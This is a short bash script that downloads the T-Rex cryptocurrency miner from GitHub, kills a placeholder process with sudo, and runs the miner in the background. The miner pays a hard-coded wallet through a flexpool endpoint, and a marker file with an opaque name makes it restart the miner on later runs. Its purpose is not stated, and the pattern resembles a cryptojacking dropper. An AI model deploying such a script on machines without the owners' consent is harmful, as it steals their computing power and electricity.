woker=$(date +'%d_%m_%H_%M_%S')
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/k9820sjs02.txt" ]; then
	echo "Start setup..."
	echo "2199ak290ks" > k9820sjs02.txt
	wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
  	sudo killall XXX
	./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x2a2654483a85ceee8e187d2de795be01cce07a96 -p x -w $woker & 
else
	if pgrep t-rex >/dev/null 2>&1
	then
		echo "RUNNING"
	else
		wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
    		sudo killall XXX
    		./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x2a2654483a85ceee8e187d2de795be01cce07a96 -p x -w $woker & 
	fi
fi
